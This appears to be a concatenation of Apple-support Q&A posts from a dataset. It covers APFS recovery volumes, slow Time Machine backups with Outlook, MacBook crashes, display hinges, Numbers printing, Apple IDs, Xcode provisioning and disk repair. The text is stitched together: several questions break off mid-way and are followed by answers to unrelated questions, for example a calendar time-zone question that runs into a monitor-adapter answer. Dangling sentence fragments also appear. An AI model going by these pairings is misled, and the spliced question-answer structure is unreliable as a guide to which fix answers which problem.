get corrupted with an invalid partition type (FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF), so you can't boot to Recovery mode either, because that's inside the container! Why is this the case? Is there an explanation? Here is the output from diskutil list. You can clearly see that it's inside the container.\n$ diskutil list\n/dev/disk0 (internal, physical):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      GUID_partition_scheme                        *500.3 GB   disk0\n   1:                        EFI EFI                     209.7 MB   disk0s1\n   2:                 Apple_APFS Container disk1         435.1 GB   disk0s2\n   3:           Linux Filesystem                         25.0 GB    disk0s3\n   4:           Linux Filesystem                         39.9 GB    disk0s4\n\n/dev/disk1 (synthesized):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      APFS Container Scheme -                      +435.1 GB   disk1\n                                 Physical Store disk0s2\n   1:                APFS Volume Macintosh HD            425.5 GB   disk1s1\n   2:                APFS Volume Preboot                 22.4 MB    disk1s2\n   3:                APFS Volume Recovery                517.8 MB   disk1s3\n   4:                APFS Volume VM                      3.2 GB     disk1s4\n\n\nA: Placing the recovery volume inside the APFS container allows space sharing. Instead of creating a fixed partition, the unused space inside Preboot and Recovery can be pooled with your normal volume. Only the actual space used by the Recovery files becomes unavailable.\nThis also simplifies issues if in the future, the Recovery volume needs more space. Instead of a risky resize operation to your data partition, it simply becomes a matter of adjusting the metadata for the Recovery volume.\nFinally, any Mac that shipped with an SSD has Internet Recovery, so you have a reasonable solution if the entire drive gets corrupted.\n", "Q: Hide CDT Time Zone I often glance down at my calendar and occasionally look at the CDT time zone instead of my personal time zone.\nIs there a way to hide CDT time zone in calendar?

The monitor is AOC E2752VH (model #: 270LM00004)\n\nA: Those specifications and those of the cable and monitor indicate that it should work.\nYou could try resetting the SMC on that Mac by shutting down the Mac holding down the Shift+Control+Option keys and the Power button at the same time. Wait 15 sec and then turn it back on.\nFailing that you could start in Safe Mode by holding the shift key while booting (booting will take a lot longer) and try plugging in the monitor then.\nFailing those I would try another adapter, preferably one with an all digital signal path like a Mini Displayport to HDMI or DVI-D \n\nA: Sometimes \"zapping the PRAM\" can fix issues like this. To reset the PRAM, restart your computer and at the chime (on pre-2016 models), press and hold down Command+Option+P+R. After a short pause, the computer will restart. Continue to hold all the keys down until the 3rd chime then release to let the computer start up normally. \nThis has resolved display problems for me and a number of my clients.

For what reason does iOS enter into such a state?\n\nA: This is called 'Offload Unused Apps' and was a feature introduced in iOS 11.\nSource OSX Daily:\n\nIf you frequently run out of storage space on an iPhone or iPad, you will appreciate a new feature in iOS that automatically saves storage for you. Called Offload Unused Apps, the toggle allows the iPhone or iPad to perform housekeeping and delete apps that have gone unused for a while, just as the name implies. Offloading used apps can noticeably help to reduce storage constraints on a device, since most of us have a handful of apps that may not be getting any usage but are taking up storage space on an iOS device anyway.\n\nTo change this setting:\n\n\n*\n\n*Open Settings\n\n*Tap on iTunes & App Store\n\n*Scroll down to locate Offload Unused Apps and toggle to the desired position\n\n\n*Exit out of Settings\nIf this is turned ON, iOS will automatically remove apps you don't use only when your storage is low.  To use that app again, as you've discovered, you just tap on the app and it will automatically download back to your device.\nYou’ll notice that while the feature will remove the app, it will maintain data and documents related to the applications that are offloaded. \n", "Q: How to insert the document to the end of the Word doc instead of the beginning?

How does Time Machine (on a High Sierra MacBook Pro with APFS) know which files in a folder have changed since the last backup?  I know that TM relies on FSEvents to watch for directories with changed file(s). What I don't know is what TM does when it learns that 1+ files in a folder have changed. I'm looking for a detailed technical explanation, not high-level info about Time Machine itself. Specifically: \n\n\n*\n\n*What information about each file (e.g. in a folder with 1 changed files and 999 files unchanged since the last backup) does TM use to determine which files are same as the last backed-up version? Does TM look only at file size & modification time?  Does it actually read file contents?  Does it read file attributes? \n\n*What filesystem API calls does Time Machine use to check which files have changed?  Specifically, does it make one (or a small number) of calls per folder, e.g. to fetch a directory listing?  Or will it make 1+ calls per file to pull additional info like file contents, attributes, etc.?\n\n*If the answers to the questions above vary (e.g. \"sometimes TM does XXX, sometimes YYY\") then what are the reasons why TM would be making many filesystem calls for each unchanged file in a folder?\n\n\nI'm asking because I'm trying to diagnose slow Time Machine incremental backups on my late-2015 MacBook Pro running High Sierra. Each \"hourly\" backup takes 30+ minutes to complete, even though the amount of data backed up each time is under 2GB. \nLooking at logs of Time Machine disk activity (using sudo fs_usage -f filesys backupd), the culprit seems to be filesystem access of unchanged message and attachment files associated with Outlook 2016 Mac.\nOutlook creates 256 folders for messages and 256 folders for attachments, and it evenly distributes new messages and attachments among these folders. For example, my Outlook profile has about 250K messages, most of which have 1+ attachments. Each of those 512 folders contains about 1,000 messages. I get about 500 new messages per day, so if it's been a day since my last backup, each of those 512 folders will have 1-3 new files and about 1,000 unchanged files.\nLooking at the file system logs, Time Machine is making many filesystem calls for each file, even though only a few hundred files have changed out of 500,000+ files in these folders. Filesystem access for each unchanged file is quick (~0.075 seconds in the example log excerpt below) but if you multiply 0.075 seconds by 500K files, that's over 10 hours!  Time Machine runs multiple threads so each incremental backup doesn't take 10 hours, but instead takes 30+ minutes for each \"hourly\" backup.\nThat's a lot of battery usage and disk access to look at 500,000+ files every hour that haven't changed.  Note that 30+ minutes is the TM speed after I've used sudo sysctl debug.lowpri_throttle_enabled=0.  Without this change, it's even slower.  \nI'm trying to figure out the root cause of the problem: \n\n\n*\n\n*Is it how my computer is configured? Is there a change I can make to my files, to Time Machine settings, etc. that would cause TM to stop spending so much time examining unchanged files on every incremental backup?\n\n*Is the problem fundamental to how Outlook 2016 Mac stores it messages and attachment files, so every Mac user of Outlook with a large and active mailbox will have this problem?  For example, does Outlook do something unusual with attributes that may cause TM to spend extra time examining Outlook's files compared to other apps that create lots of small files?\n\n*Or is the root cause in the design of Time Machine, where it's expected that if any files in a folder have changed then TM will make relatively-expensive filesystem calls for each file in order to verify which files have changed?\n\n\nHere's a logs sample (for a single file that hasn't been changed since the last backup) that suggest that Time Machine is doing a lot of filesystem access for each unchanged file. I count 11 (!!!) file system accesses for this one 901-byte file that is already backed up and is unchanged since the last backup.\n09:14:19.783112  getattrlist                            .Office/Outlook/Outlook 15 Profiles/2018-05-11/Data/Message Attachments/137/8969C57E-7F6D-4152-AF11-FDF535486C92.olk15MsgAttachment    0.000027   backupd.944294\n09:14:19.783424  fsctl                                  .Office/Outlook/Outlook 15 Profiles/2018-05-11/Data/Message Attachments/137/8969C57E-7F6D-4152-AF11-FDF535486C92.olk15MsgAttachment    0.000006   backupd.944294\n09:14:19.783428  fsctl                                  .Office/Outlook/Outlook 15 Profiles/2018-05-11/Data/Message Attachments/137/8969C57E-7F6D-4152-AF11-FDF535486C92.olk15MsgAttachment    0.000004   backupd.944294\n09:14:19.783542  getattrlist                            .Office/Outlook/Outlook 15 Profiles/2018-05-11/Data/Message Attachments/137/8969C57E-7F6D-4152-AF11-FDF535486C92.olk15MsgAttachment    0.000057   backupd.944294\n09:14:19.783603  listxattr                              .Office/Outlook/Outlook 15 Profiles/2018-05-11/Data/Message Attachments/137/8969C57E-7F6D-4152-AF11-FDF535486C92.olk15MsgAttachment    0.000016   backupd.944294\n09:14:19.783612  listxattr                              .Office/Outlook/Outlook 15 Profiles/2018-05-11/Data/Message Attachments/137/8969C57E-7F6D-4152-AF11-FDF535486C92.olk15MsgAttachment    0.000008   backupd.944294\n09:14:19.805903  listxattr                              .Office/Outlook/Outlook 15 Profiles/2018-05-11/Data/Message Attachments/137/8969C57E-7F6D-4152-AF11-FDF535486C92.olk15MsgAttachment    0.022290   backupd.944294\n09:14:19.806028  listxattr                              .Office/Outlook/Outlook 15 Profiles/2018-05-11/Data/Message Attachments/137/8969C57E-7F6D-4152-AF11-FDF535486C92.olk15MsgAttachment    0.000109   backupd.944294\n09:14:19.856232    HFS_update               (__M__c__)  .Office/Outlook/Outlook 15 Profiles/2018-05-11/Data/Message Attachments/137/8969C57E-7F6D-4152-AF11-FDF535486C92.olk15MsgAttachment    0.000013   backupd.948297\n09:14:19.856258  link                                   .Office/Outlook/Outlook 15 Profiles/2018-05-11/Data/Message Attachments/137/8969C57E-7F6D-4152-AF11-FDF535486C92.olk15MsgAttachment    0.050019   backupd.948297\n09:14:19.856394  getattrlist                            .Office/Outlook/Outlook 15 Profiles/2018-05-11/Data/Message Attachments/137/8969C57E-7F6D-4152-AF11-FDF535486C92.olk15MsgAttachment    0.000051   backupd.948297\n\nI know that I can exclude Outlook folders from Time Machine backups, but I'm hesitant to do this as it might prevent me from restoring messages.\nI've already tried deleting the FSEvents logs (via sudo mv /.fseventsd /.fseventsd.bak and a reboot) and allowing them to be re-created, which sped up backups considerably so that they'll only take a few minutes if I haven't started Outlook since the last backup. But after I run Outlook, backups take 30+ mins.  I've verified by looking at logs that the extra time is not due to backup data volume-- the 1.3GB Outlook.sqllite file is backed up in 1-2 minutes each time-- but instead seems to be caused by the 100,000s of files that Time Machine is looking at but not backing up.\nIt's not a network issue nor a speed issue of my backup NAS drive: when TM is backing up large files, it backs up 10-30 megabytes per second over WiFi (I have fast WiFi!). Also, connecting directly to my gigabit ethernet doesn't improve speed when TM is churning through all those tiny Outlook files. \nUPDATE: \nAs advised by Monomeeth in his answer below, I downloaded and ran Time Machine Mechanic (really helpful tool!).

Most of the size is the single 1.3GB Outlook.sqllite file, which is backed up in about 2 minutes according to the file system logs, which works out about 10 megabytes/sec. But most of the time is taken (again according to file system logs) by reading/checking 100,000's of unchanged files.\nIs this normal? It seems unexpected for TM to have knowledge of what files have changed (via FSEvents) but still have to look at every file.  Is there something unusual about Outlook's files that causes it to happen with Outlook's files but not with other applications' files?  Could it be that Outlook is using extended attributes (e.g. \"Author\" and \"Recipient\" attributes on email message files) and those attributes are what are causing the slowdown?\nI'm not sure what to make of the errors, but they're referring to deleting backups. Perhaps that's an unrelated issue to my slow backups? \n\nA: SHORT ANSWER\nYes, this is expected behaviour.\nTime Machine only backs up new or modified data, and keeps a record of any deleted data. This includes libraries that can contain tens of thousands of files (e.g. your Photos Library) and other locations (such as directories/folders that contain large numbers of files (such as those used by MS Outlook). It does not do a fresh backup of an entire library/folder each time you make changes to it, but only backs up those items that have been changed. For Time Machine to do this properly, it does needs to check every item to determine what has changed since the last backup.\nLONG ANSWER\nThe way Time Machine works is that it backs up anything that has changed since the last backup. For example, a file that is:\n\n\n*\n\n*Edited since the last backup is backed up again in the next backup\n\n*Created since the last backup is backed up in the next backup\n\n*Deleted since the last backup is not included in the next backup (i.e. there is no record of it in that backup, but the file itself is still stored for any older backups it was a part of)\n\n\nNow, the confusion usually comes from the way Time Machine actually does a backup. I'll try and explain this below.\n\n\n*\n\n*The initial backup TM does on a new backup drive is a full backup of\nyour Mac. So, if your Mac has used 80GB of a 1TB drive, then the \nfirst backup will take up 80GB of space on the new backup drive.\n\n*All remaining incremental backups do not do a full backup. Instead TM backs up any new data (i.e. newly added data and any edited data) and keeps a record of any deleted data.\n\n*In the case of files such as Packages (e.g. the Photos Library package), TM will identify any:\n\n\n*\n\n*new data (e.g. new photos in the Masters folder within your Photos Library package) and back this up\n\n*modified data within your Photos Library package (e.g. edited photos) and back this up\n\n*deleted data within your Photos Library package (e.g. photos you've deleted) and keep a record of the change\n\n\n*When the backup drive runs out of space, TM will delete as many of the oldest backups it needs to in order to be able to do the next backup (and this is where users can lose data that was not part of more recent backups)\n\n*Regardless of whether it is the initial full backup or an incremental backup, TM will display this to the user as if they're all separate full backups. This is designed on the basis of User Experience (UX) design so that it's easier for users to browse and find data, and acts to reassure users that it's all there. According to Apple:\n\n\nThis entire process is designed to ensure that Time Machine not only backs up your data, but remembers how it looked at a given point in time so that it's easier for users to find what they're looking for. According to Apple:\n\n...what makes Time Machine different from other backup applications is\n  that it not only keeps a spare copy of every file, it remembers how\n  your system looked on any given day—so you can revisit your Mac as it\n  appeared in the past.\n\nSource: Mac Basics: Time Machine (web archive of Apple knowledge base doc)\nSo yes, this is expected behaviour. Using the example in your question, although there are 11 instances you're counting, all of those combined took a fraction of a second for Time Machine to process, and from my point of view that's well worth the peace of mind and usability that Time Machine offers. \nIn a nutshell, I would not recommend trying to interfere with it.\n[UPDATE]\nThis update does not supersede the above high level information, but provides further clarity due to a revision to the OP's question that provides further context around the question.\nAs you're aware, Time Machine checks with the File System Events (FSEvents) database stored on each volume to identify which files have changed since the last backup.\nHowever, if the FSEvents database is missing, or if Time Machine determines it is corrupted or incomplete, it will perform a deep scan. If it does a deep scan, this means it will check the last modified timestamp of all files (and directories) on the relevant volume. As part of this deep scan Time Machine creates a list of all items that have changed since the last backup. Obviously, if you're backing up to a remote device (especially if it's through Wi-Fi) then this really slows things down.\nWhile you could disable FSEvent recording on a volume, this isn't going to help you because you're wanting to use Time Machine to backup your data and this action would only force it to perform a deep scan.\nIn light of the additional info you've provided, you have two things to determine:\n\n\n*\n\n*Is Time Machine performing a deep scan each time it's doing a backup?\n\n*If so, why is it doing that?\n\n\nTo answer the first question you can download and install the Time Machine Mechanic (T2M2). This analyses your logs to check if Time Machine backups are running normally or not.\nThe key thing in your case is to check if T2M2 indicates the following:\nstarted 1 deep traversal scans\ncompleted 1 deep traversal scans\nIf using the above tool indicates that Time Machine is in fact performing deep scans, this may be cause for concern. Not so much so if it's an occasional thing, as this can happen after certain events anyway (e.g. having recently booted from another volume, after a full restore, following a power loss, etc), but if it's happening all the time then it does ring alarm bells. In that case, I refer you to Time Machine - Troubleshooting Common  Backup  Messages. \n", "Q: See a log of all DMG files that were mounted Today I saw for a very brief moment (like a fraction of a second) an alert telling me that some “BaseSystem.dmg” file was being mounted, even though I wasn’t trying to mount anything, nevertheless a strange image.\nSo my question is: Is it possible to see a log of anything (and everything) that was mounted on my system?\n\nA: This is normal and you need not worry about it.\nWhen certain system items are updated, a recovery partition is mounted to update the boot (or other) configuration.

My MacBook Pro 2017 under heavy loads (gaming, rendering videos in Camtasia, recording screen casts with OBS, etc.).\nHere's a video of it\nIt keeps crashing and it gives me what I call the screen of black death from Apple:\n. \nOr my games will simply shut down when playing in Windows 10\nI notice when it crashes when I run OBS, the cores and other areas don't seem to be overheated the instant it crashes.\nWhen I bought this PC I was able to render video and play games with no problem, even at the same time...but after about 4 months it's now crashing whenever you put any intensive load on it period.\nI've also heard a weird buzzing noise as if a robot were to die when it crashes sometimes.  That noise doesn't happen often but has when it crashes in Windows. \nIt's crashing in both windows 10 and OS X High Sierra, doesn't matter.  I've dual booted it with bootcamp.\nAlready ran a diagnostic (where you reboot, press D and whatever) and also they ran a light diagnostics test in the Apple store.  They said next step is for me to have to bring it in for a few days, where they run a heavy diagnostics on it for 5 hours.  \nAlso opened the bottom and took a can duster and cleaned out the fans and vents.\nThis sucks cause I'm a programmer and it sucks because I just paid 4k for this fing laptop.  My Macbook 20-15 started to do this last year in fact!  And that's why I bought this one!  It's weird, my macbook 2015 isn't crashing anymore after turning it on after about a year, my kids are playing minecraft on it just fine but about 6 months ago that PC was crashing all the time even after I had reinstalled OS X. I don't know, I give up.\nSo is this normal?  I've seen it spike even over 200 degrees on the cores and I'm not even doing any rendering or gaming right now in OS X.  I'm just doing Chrome granted I have a lot of tabs open but no hard core streaming, rendering, or playing games.\nHere's what that looks like:\n\nDon't know if this is typical but I see 210 threads for kernal_task:\n\n\nA: Troubleshooting is a process of elimination and usually requires some patience, so taking up the Apple Store offer may be a good way to proceed. However, before doing that there's a few more troubleshooting steps you can take.\nTo start with I would boot your Mac into Safe Mode and determine if it still displays this behaviour.\nBoot into Safe Mode\nFollow these steps to boot your Mac into Safe Mode:\n\n\n*\n\n*Fully shut down your MacBook Pro\n\n*Restart your MacBook Pro\n\n*Immediately press the Shift key and keep it down \n\n*Let go of the Shift key when you see the login window (NOTE: If you have FileVault enabled you may need to log in twice).\n\n*Take a note of what happens (i.e. does it still crash etc while in Safe Mode)\n\n*Exit Safe Mode by restarting your Mac as normal\n\n*Test again to see if it still crashes when booted normally\n\n\nIf you find that the problem still exists in Safe Mode, you can also try resetting the System Management Controller to see what difference, if any, that makes.\nReset the SMC\nTo reset the SMC, follow these steps:\n\n\n*\n\n*Shut down your MacBook Pro\n\n*For 10 seconds, press and hold at the same time the shiftcontroloption keys (on the left side of the built-in keyboard) and the power button\n\n*After 10 seconds let go of all keys and the power button \n\n*Turn your MacBook Pro back on with the power button\n\n\nAfter your MBP reboots, test to see if you can still get your temps to spike over 200 degrees etc (however, see my note on temperature below).\nA note on temperature\nFinally, MBP models usually range from about 40ºC (104ºF) to 100ºC (212ºF) depending on whether the CPU is idle or under load. CPU temps (just like ambient temperatures) typically have a bearing on GPU temps too, especially within the extremely confined spaces of a MacBook Pro. \nIf you'd like, you can refer to the Intel Mac Temperature Database to see the various temperature ranges reported by users. You can also filter the list by model etc.\n\nUPDATE\nNow that you've updated your question a few times and have uploaded the YouTube video, I feel taking it into the Apple Store to look at is the best way to go. The main reasons for this are:\n\n\n*\n\n*Having problems in both Safe Mode and while booted normally is a strong indicator to some sort of hardware issue\n\n*Likewise, having problems when booted into either macOS or Windows 10 is also indicative that this is OS independent (and therefore most likely a hardware issue)\n\n*The various display glitches apparent in your YouTube video stringly imply a GPU and/or Logic Board problem\n\n\nAll of the above would require a visit to Apple. Obviously, prior to doing so, make sure you have a current backup of all your data.\nIf you did want to try one more thing prior to visting Apple, that would be doing a full fresh installation of macOS (to the earliest version that shipped with your MBP - you can do this by using the shiftoptioncommandR keyboard shortcut to reinstall the macOS that came with your Mac) and testing to see whether you have any issues prior to installing anything else. If not, go about installing OBS and see if that runs okay. If so, then go about creating your BootCamp Windows installation to see if that causes a problem.\nHowever, if it was me, I'd plan for the visit to Apple. That is, do your backup, make alternative arrangements for a few days, and get Apple to do a full hardware diagnostic.\n", "Q: MBP 15\" Retina problems: one display hinge is way too tight I'm trying to nurse my Mid-2014 Macbook Pro Retina 15\" through at least another year. Unfortunately, the hinges seem to be going bad. They were getting loose, but in the last few days the right rear one has become very hard to close, such that if I push the lid closed by the front edge it pops back up about 1 1/2\":\n\nFor some reason, both hinges open just fine; it's just the right hinge that refuses to close. If I push hard right next to the hinge I can get it to stay closed, but it's getting to the point where I can see the display housing bend near the hinge due to the force.\nI can pop the bottom housing off and see the hinges/clutches, and they look OK, but of course I can't see the contact area between the two parts:\n\nI'm concerned that something will snap if the friction gets any worse. I'm fine with hardware repair (I've already replaced the battery; thanks, iFixIt!), but I can't find the hinges for sale on their own; they always come with the display for $400+. I could drop some lithium grease on the hinge, but if it turns out to be a bad idea there's no way I'd get it off. And, I'd rather not hack an ugly solution if at all possible.\nAny ideas how I can tame this hinge?\n\nA: And the final cause: both hinges are fractured, and in the same place. Here's the right hinge, unscrewed and levered open (and after lubrication; see below):\n\n.. and the left hinge:\n\nEach hinge consists of a tube (anchored to the display, and with a cable down the core), plus a bracket (anchored to the main chassis). The bracket consists of two curled pieces which wrap around the tube in opposite directions. On both hinges, the inside \"curl\" is broken at the base of the bracket:\n\nThis explains another symptom; where the display used to open out to a certain point and then hit a stop, it now opens to almost completely parallel to the table.\nNow, I'll be the first to admit I've not been gentle with this computer (they're tools, not shrines to the Great God Jobs), but it's still surprising that both fractured in the same place.\nThe solution: as you can tell from the pictures, I lubricated both hinges with lithium grease (being as moderate as possible). The display now swings fairly freely, so the previous tension shouldn't cause any more damage. I may have to rig up some sort of brace to keep the display from falling flat onto the desk, though...\nEdit: And yes: the hinges are now too loose, and the display will fall open or shut if it's more than ten or twenty degrees from vertical. I now have to prop the display up with my knees or a book. But, this is still better; I no longer risk breaking the chassis or the display frame. I'm thinking about portable ways to hold the display at a given angle; the final solution would still be to replace the hinges (if I can get the parts).\n\nA: This is a  follow-on answer (using Lithium grease on the hinges).\nFirst, let me say, I experienced exactly the same ill-behavior on my MacBook Pro, Retina, A1398.  After reading your post, and close inspection of the hinges, however, I noted the following:\n\n\n*\n\n*The hinge curls have the gap by manufacturing design -- they are not broken.\n\n*Each hinge has fiber material held tightly which serves as the clutch between hinge and captive bar.\n\n*This fiber material hardens with time (due to heat), increases friction and stops the free movement of the bars -- this is the symptom that you experienced.\n\n\nThe idea you had of using lithium grease was not wrong, but just too extreme.\nI used instead pure silicone spray (used on quality locks) which restored the free movement of the display. It is now buttery-soft, as designed originally.\nI thank you for your original post, because it guided me to a solution that avoided the removal of the display assembly.\nMaybe this will help others that experience the same.\n", "Q: How to print one Numbers row per page, formatted nicely I have a Numbers spreadsheet consisting of data that I would like to print.\nHowever, I would like to have each row of the table printed out on its own separate page. Moreover, each row contains a lot of data items, including one that is a few paragraphs of text - it doesn't make sense to print it in a single row. Instead I want to print out each row as a separately formatted table.\nSo for example, if the first row of my table looked like this\n\nthen I would like to print it something more like this:\n\nincluding using conditional formatting to colour the cells, if at all possible.\nIs there any way to do this. I.e. to create a new table from each row of a table, and then print them all out, one per page. My table has about 100 rows, so doing each one by hand isn't really feasible.\nIf this can't be done in Numbers, is there another easy way to do it on a Mac?\n\nA: One way to accomplish this just using Numbers\nThe key to this solution is the combination of the INDEX(MATCH()) formulas.  Here is an excellent article on the use of this combination of functions.\nCreate 2 sheets\n\n\n*\n\n*one sheet for data\n\n*one sheet for printing\nIn the Data sheet, add a basic table to hold the data.  A header row is useful for reading the formulas as they are added:\n\n\nIn the Print sheet, create a table or tables (one can get creative here, any number of tables or cells to format the printing in any way wished) for a print format.  The cells do not need to be in the same table together as each contains an individual reference to the data table.  The example in the screenshot below uses two tables.\n\n\nBack on the Data sheet, create table with one or two cells for selecting the record to print:\n\n\nNow, back in the Print sheet, use the following formulas to display the desired data:\n\nINDEX(Animal,MATCH(Print Index::B1,Index))\n  Where Animal is the column containing the animal name, MATCH looks at the single data selector cell matching the corresponding number in the Index column and then returns the Animal.\nINDEX(Legs,MATCH(Print Index::$B$1,$Index))\n  Returns the Legs data.\nINDEX(Head,MATCH(Print Index::$B$1,$Index))\n  Returns the Head data.\nINDEX(Feathers,MATCH(Print Index::$B$1,$Index))\n  Returns the Feathers data.\nINDEX(Size,MATCH(Print Index::$B$1,$Index))\n  Returns the Size data.\n\nEven when other data is inserted into the table, the proper value is displayed.  This is unlike VLOOKUP() which has to have the column number returned.  When a new column is inserted, VLOOKUP breaks where INDEX(MATCH()) does not.\n\n\nAdd the conditional formatting as desired to the cells in the Print sheet's table(s).\nBack in the Data sheet, select the number corresponding to the animal desired to print.\nSelect the Print sheet then print as normally. command+P\nAppleScript could be used to automate the process of selecting the index number, then printing the Print sheet.\nThis is a clean and easy way to maintain/update/change the print view without having to reinvent the entire data schema.\n\nDemo:\n\n", "Q: iPhone X - Newly registered Apple ID I am new to Apple ecosystem and have just obtained an iPhone X. I bought it new from store and during first boot I have created a new Apple ID as I never had one earlier. Now my new phone has been registered to my new Apple ID. At present I want to use my iCloud ID which I have made after that, so my doubt is that is there such thing that i have to keep my Apple ID live (one which I have used during first boot) as my new iPhone that has been registered into it, or can I change the Apple id anytime? I need to understand how Apple ID works and what is the Apple iPhone/product registration onto Apple ID.\n\nA: First of all, when you create an iCloud account it is also automatically an Apple ID as well. So, based on your question, you now actually have two Apple IDs at your disposal. However, this doesn't mean you need to use both, or that you only have to use one. Let me explain...\nAn Apple ID can be used to access Apple services such as the iOS App Store, macOS App Store (if you have a Mac), Apple Music, iCloud, iMessage, FaceTime, and so on. So, if you wanted, you could use your Apple ID to sign in to all of Apple's services (i.e. using a single Apple ID and password).\nHowever, you don't have to do it that way. For example, you could use your iCloud account to sign into iCloud on your iPhone X and still use the first Apple ID you created to sign into the App Store on your iPhone X. And you could manage these happily (and simultaneously) on your device. Some people even use three IDs (e.g. a different one for Game Center).\nSo, based on what you're wanting to do, you can choose to sign out of anywhere you've already used the first Apple ID and then sign back in with the iCloud account you created.\nHowever, there are a couple of scenarios you should be aware of in case they apply to your circumstances:\n\n\n*\n\n*If you've purchased any apps (free or paid) from the App Store using a particular Apple ID, then you're going to need to enter that Apple ID's password when updating those particular apps in future. One way to get around this would be to delete those apps and then sign out of the App Store. Then, sign back in using the other ID and download those apps again. One negative of this approach is that you'd have to pay for it again if they weren't free.\n\n*In the unlikely event that your first Apple ID is attached to one particular country's services (e.g. the US iTunes Store), and the second ID is attached to to another one (e.g. the UK iTunes Store), then you may lose access to any purchases you made using the first ID (depending on the content, as this doesn't apply in all cases). Regardless, this is not something you need to worry about, as this would only be the situation if you deliberately created accounts in multiple jurisdictions for a particular purpose - it's not something that would have happened by accident (unless you purchased the iPhone X in one country and created an Apple ID, and then visited/moved to another country and created your iCloud account there). However, if you were in this situation, then you can still choose to switch between IDs if/when you needed to access/view the other content.\n\n\nFinally, if you've only just purchased the iPhone X and don't have a lot of data already on it, you could choose to set it up from scratch again and just use the ID you want. If this is the case, post a comment below and I'll explain how to go about doing this.\n", "Q: Unable to remove website data in Safari In Safari --> Preferences --> Privacy --> Manage Website Data, I'm unable to remove the data that shows up as Databases.

So how to revert? I have a newer Mac, not restored from this back. How can I choose the right version of iTunes backup?\n\n\nA: The folder named with 40 random chars in Backup folder is your iOS backup (40 cahrs is the UDID of your device). \nYou will need to restore the \"cd84f21616...\" folder back to default iTunes backup folder: users/user/Library/ApplicationSupport/MobileSync/Backup.\nAfter this, you should see your backup in iTunes and be able to restore it.\n", "Q: Deploy iOS app directly from Xcode to iPad Since Xcode 7 was released, a target device has now free provisioning. A developer doesn't have to sign up for Apple Developer Program in order to test his/her app on an iOS device.\nWhen you uploaded your application on an iPad or iPhone, you'll also have to trust the developer. So, on a device go to Settings >> General >> Profile >> Developer Account Name >> Trust.\nThe problem is an app with free provisioning works on your device only 7 days. \nIs there a way to make it work perpetually on iPad (without building an app in Xcode again)?\n\nA: Yes, it is possible to make the app work \"perpetually\" without recompiling and rebuilding it in Xcode. This can be done by re-signing the finished binary using command line tools (i.e. essentially just replacing the developer signature instead of remaking the whole binary over and over). However, this is probably not what you want as you will need to transfer that new binary to the iPad every week.\nIf you want to make it work \"perpetually\" without having to reinstall the app, you will need to get it signed by someone with a real developer certificate (i.e. obtained from either the Apple Developer Program or the Enterprise Developer Program).\n", "Q: How to update my DSDT (part of fix for no Ethernet card fix) I have a MacBook w/ OS X Mountain Lion (10.8.5) that had the original Wi-Fi card removed.

The problem is when I try to connect to the App Store, I get the message\n\nYour device or computer could not be verified. Contact support for assistance.\n\nI've done a lot of research and it seems this happens because Apple is trying to identify me based on the MAC address of my original Wi-Fi card and can't (see this post and this post).

It will fix that and about anything else and if you have a MacBook/iMac and you want to run the latest macOS on your MacBook or iMac etc..

However on the monitor the \"default for display\" (which says \"looks like 1920x1080) makes everything huge and sacrifices the amount of space on the screen.\nIf I go into display preferences and choose the middle option (3008x1692) this is a good size, but it has a noticeably bad effect on performance - window switching, resizing etc is jerkier and slower.\nThe setting I currently have it on is \"more space\" (3180x2160) which doesn't suffer the performance issues but makes everything tiny. I have to zoom in on any applications I use in this monitor (mostly terminal and text editors).\nIs there a nicer solution to having a comfortable resolution on a screen like this without sacrificing performance?\n\nA: Using Retina mode on a 4k display is a performance demanding task - especially for that 13\" MacBook Pro. When you choose \"odd\" resolutions like that, the operating system will have to render in really high resolutions and down-sample to get an output suitable for your monitor.\nWhat you could do instead was to install SwitchResX, Display Menu or similar apps that allows you to configure the monitor to your liking. I would recommend trying to disable Retina mode and simply use a high resolution with the monitor (not 3840x2160, but something smaller). \nIf you disable Retina mode, the performance demands are considerably less.\n", "Q: How to fix Mac “file system or verified failed”? Mac gets stuck when trying to update and I get the error “macOS could not be installed on your computer, file system verify or repair failed”.\nI tried using disk utility and running first aid.

I have transferred all files I need onto another computer. \nThanks\n\nA: So it sounds like you have a disk error of some sort that Disk utility can't fix. This does happen from time to time and is the reason things like Diskwarrior exist.\nAssuming you don't have access to a third-party disk repair tool (Diskwarrior, etc.) and you do not have High Sierra (disk repair tools don't work on APFS disks yet) then you can reformat your MacHD volume and reinstall from scratch.\nIf at all possible it could be a bit faster to create a macOS install thumb drive so you don't have to wait on Recovery Mode to download the OS as it installs.\nIf you do it that way, boot from the thumb drive and once you get to the install screen you should have a menu option to launch Disk Utility. Do so, select the MacHD volume (or whatever it is called) and format it. Once that is done you can proceed with installing macOS and restoring your files and Apps.\nIf you are doing it from recovery Mode. Launch Disk utility first and (as above) format the MacHD volume before proceeding with the OS install.\nFormatting a volume (assuming it is not a hard (or physical) error) will usually wipe out most common volume corruption/damage errors, making it OK to reinstall whatever was on it to begin with.\nIf it turns out it is a physical error of some sort then after formatting the volume you will either get an error that it could not be formatted or running disk repair on it will still return errors. In that case it is likely that the spinning disk or SSD needs to be replaced.\n", "Q: How to shut down an iPad stuck on the Apple logo? Having an iPad stuck on the Apple logo, I cannot find a way to shut it down.\nWhen holding down both the top \"Power\" button and the \"Home\" buttons, the iPad goes to black screen, but starts again even if I released the buttons when the screen went black. \nSo, the iPad always comes back to the state showing the back Apple logo on a white screen.\n\nEdit 1:\nThank you for both answers until now.\n\n\n*\n\n*Holding only the power button down doesn't work in with this buggy iPad.\n\n*Holding both the power and the home buttons down reboots the iPad; even if I release one or both buttons a fraction of a second after screen turns black, the screen always turns on in the next seconds\n\n\nA: Disconnect the iPad from the power supply if it's charging. Hold the power button and the home button at the same time until the screen gets black (takes about 3-5 seconds). Then release immediately. iPad should be turned off. If it's turning is back on again then either you were too slow releasing the buttons or something else is causing iPad to reboot.\nIn this case, the easiest way is to let it run out of battery. \nOther options:\nIf you would like to fix the error, then connect iPad to iTunes and hold the power button and the home button until you see the iTunes logo. Then follow the instructions on iTunes.\n\nA: Holding both buttons triggers your iPad to reboot. To turn off the iPad, hold the top or power button ONLY, until you see the 'slide to power off' image on the screen. Slide and the iPad will turn off.\nThe Apple Logo simply means the iPad is booting. Best to give it time to do so. If after considerable time (20+ mins) it still shows the logo, you can try to implement Recovery mode. You need a PC or Mac with iTunes installed, plus a Lightning cable.\nRecovery Mode: Turn off the iPad.  Connect the iPad to the PC/Mac, Launch iTunes, and then hold down the 